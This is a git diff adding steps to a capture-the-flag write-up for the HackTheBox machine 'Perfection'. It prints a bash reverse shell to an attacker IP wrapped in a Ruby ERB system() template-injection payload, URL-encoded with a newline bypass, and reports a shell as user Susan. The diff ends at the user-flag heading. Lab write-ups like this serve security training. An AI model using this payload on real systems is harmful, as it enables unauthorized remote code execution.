@@ -1,4 +1,4 @@
-![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1cca854d-f213-4019-a6b0-6f2e4482120b)# Perfection
+# Perfection
 > Write-up author: jon-brandy
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a25ccf1b-8041-48e5-9d09-020a945528ef)
@@ -111,7 +111,34 @@ I dropped all the useful links at the bottom of this MD file.
 ```
 
 16. Amazing! Let's try to do reverse shell so it's easier for us to get the user flag.
-17. 
+17. This time let's use the system() code execution payload.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/85217040-bdf2-46d3-8b8f-ba80c927bbdb)
+
+
+```txt
+Bash Reverse Shell Payload:
+bash -i >& /dev/tcp/10.10.14.24/1337 0>&1
+
+Wrapped it with Ruby Code Execution Payload:
+<%= system("bash -c 'exec bash -i >& /dev/tcp/10.10.14.24/1337 0>&1'") %>
+
+URL ENCODE IT:
+<%= system("bash -c 'exec bash -i >& /dev/tcp/10.10.14.24/1337 0>&1'") %>
+
+FULL PAYLOAD:
+pwn%0a<%25%3d+system("bash+-c+'exec+bash+-i+>%26+/dev/tcp/10.10.14.24/1337+0>%261'")+%25>
+```
+
+18. All we need to do now is set a listener on port 1337 then send the payload using repeater.
+
+> RESULT - Got shell as Susan
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a38add66-1558-4a42-a107-6e53a39c4389)
+
+
+> GETTING THE USER FLAG
+
 
 
 
